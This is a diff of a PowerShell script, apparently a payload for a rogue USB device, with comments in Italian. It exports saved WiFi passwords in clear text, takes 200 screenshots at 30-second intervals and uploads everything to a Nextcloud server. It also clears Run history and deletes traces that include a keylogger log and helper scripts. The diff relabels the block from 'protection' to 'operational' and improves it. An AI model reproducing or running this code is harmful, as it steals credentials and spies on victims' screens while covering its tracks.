@@ -17,20 +17,21 @@ function Nextcloud-Upload {
     Invoke-RestMethod -Uri $webdavUrl -InFile $fileObject.Fullname -Headers $headers -Method Put 
 }
 
-# --- INIZIO BLOCCO DI PROTEZIONE ---
+# --- BLOCCO OPERATIVO ---
 try {
-    # 1. Pulizia iniziale record
+    # 1. Pulizia cronologia Run
     cd HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\
     Remove-Item .\RunMRU\ -ErrorAction SilentlyContinue
 
-    # 2. Export WiFi
+    # 2. Gestione Directory WiFi e Export
     $p = "C:\wipass"
-    if (!(Test-Path $p)) { mkdir $p }
-    cd $p
+    if (!(Test-Path $p)) { New-Item -Path $p -ItemType Directory -Force }
+    Set-Location $p
+
     netsh wlan export profile key=clear
-    dir *.xml | % {
-        $xml=[xml](get-content $_)
-        $a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
+    Get-ChildItem *.xml | ForEach-Object {
+        $xml = [xml](Get-Content $_)
+        $a = "========================================`r`n SSID = " + $xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " + $xml.WLANProfile.MSM.Security.sharedKey.keymaterial
         Out-File "$env:computername-wificapture.txt" -Append -InputObject $a
     }
 
@@ -38,7 +39,7 @@ try {
         "$env:computername-wificapture.txt" | Nextcloud-Upload
     }
 
-    # 3. Ciclo Screenshots
+    # 3. Ciclo Screenshot (Incrementale)
     $i = 0
     while($i -lt 200){
         Add-Type -AssemblyName System.Windows.Forms,System.Drawing
@@ -53,11 +54,14 @@ try {
         $graphics = [Drawing.Graphics]::FromImage($bmp)
         $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
 
+        # Nome file unico con indice $i
         $currentPath = "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture-$i.png"
         $bmp.Save($currentPath)
+        
         $graphics.Dispose()
         $bmp.Dispose()
       
+        # Caricamento immediato
         if (Test-Path $currentPath) {
             $currentPath | Nextcloud-Upload
         }
@@ -66,29 +70,25 @@ try {
         Start-Sleep -Seconds 30
     }
 }
+# --- BLOCCO DI PULIZIA (ESEGUITO SEMPRE) ---
 finally {
-    # --- QUESTO CODICE VIENE ESEGUITO SEMPRE ALLA FINE ---
-    # Anche se premi CTRL+C o se lo script crasha
-    
-    Write-Host "Esecuzione pulizia finale di sicurezza..." -ForegroundColor Yellow
+    # Torna a una directory sicura per evitare che la cartella wipass risulti "in uso"
+    Set-Location $env:TEMP
 
-    $paths = @(
+    $pathsToClean = @(
         "$env:APPDATA\c.ps1", 
         "$env:APPDATA\sg.ps1", 
-        "$env:APPDATA\sg2.ps1",
+        "$env:APPDATA\sg2.ps1", 
+        "C:\Users\Irene\Desktop\OMG\testing\temp.txt", 
         "$env:temp\keylogger.txt", 
         "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture-*.png",
-        "C:\wipass\*"
+        "C:\wipass" # Rimuove l'intera cartella e il suo contenuto
     )
 
-    foreach($filePath in $paths) {
-        if (Test-Path $filePath) {
-            Remove-Item $filePath -Force -Recurse -Verbose -ErrorAction SilentlyContinue
+    foreach($path in $pathsToClean) {
+        if (Test-Path $path) {
+            # -Recurse elimina sottocartelle/file, -Force forza l'eliminazione di file nascosti/sola lettura
+            Remove-Item $path -Recurse -Force -ErrorAction SilentlyContinue
         }
-    }
-    
-    # Rimuove la cartella wipass se vuota
-    if (Test-Path "C:\wipass") {
-        Remove-Item "C:\wipass" -Force -Recurse -ErrorAction SilentlyContinue
     }
 }
